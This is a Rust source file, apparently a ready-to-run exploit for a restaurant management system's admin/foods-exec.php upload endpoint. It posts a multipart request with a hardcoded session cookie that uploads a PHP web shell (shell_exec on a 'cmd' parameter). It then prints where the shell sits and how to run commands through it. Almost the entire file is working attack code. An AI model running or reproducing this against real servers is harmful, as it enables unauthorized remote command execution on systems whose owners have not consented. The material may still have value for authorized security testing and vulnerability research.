use std::env;
use std::process;

extern crate reqwest;

#[tokio::main]
async fn main() -> Result<(),reqwest::Error> {
    println!("
    ██████╗ ███╗   ███╗███████╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
    ██╔══██╗████╗ ████║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
    ██████╔╝██╔████╔██║███████╗    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
    ██╔══██╗██║╚██╔╝██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
    ██║  ██║██║ ╚═╝ ██║███████║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
    ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
    @whokilleddb                                                                                 
    ");

    // Parse command line Arguments
    let args: Vec<String> = env::args().collect();
    let size = args.len();
    if size != 2
    {
        println!("[-] Wrong Usage");
        println!("[~] Usage:");
        println!("{} URL",&args[0]);
        process::exit(0x0100);
    }

    let url = &args[1];
    println!("[+] URL: {}", url);
    let last_char = url.chars().last().unwrap();
    let target = if last_char == '/' { format!("{}{}",url,"admin/foods-exec.php") }
                 else { format!("{}{}",url,"/admin/foods-exec.php") };

    println!("[+] Target: {}",target);

    println!("\n[!] Trying Exploit!");
    let client = reqwest::Client::new();
    let resp = client
        .post(target)
        .header("User-Agent","Mozilla/4.0 (Windows NT 10.0; Win64; x64; rv:69.0)Gecko/20100101 Firefox/69.0")
        .header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        .header("Accept-Language","en-US,en;q=0.5")
        .header("Accept-Encoding","gzip, deflate")
        .header("Content-Type","multipart/form-data;boundary=---------------------------191691572411478")
        .header("Connection","close")
        .header("Referer","http://localhost:8081/rms/admin/foods.php")
        .header("Cookie","PHPSESSID=4dmIn4q1pvs4b79")
        .header("Upgrade-Insecure-Requests","1")
        .body("\n\n-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"reverse-shell.php\"\r\nContent-Type: text/html\r\n\n<?php echo shell_exec($_GET[\"cmd\"]); ?>\r\n-----------------------------191691572411478\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\nAdd\r\n-----------------------------191691572411478--\n")
        .send()
        .await?;

    match resp.status(){
        reqwest::StatusCode::OK => {
            println!("[+] Response Code: {}",resp.status());
            println!("[+] PHP Shell Uploaded At: {}/images/reverse-shell.php",url);
            println!("[+] Exec Commands With: ?cmd=COMMAND");
        },
        _ => {
            panic!("[+] Something Went Wrong :(");
        }
    }
    Ok(())
}
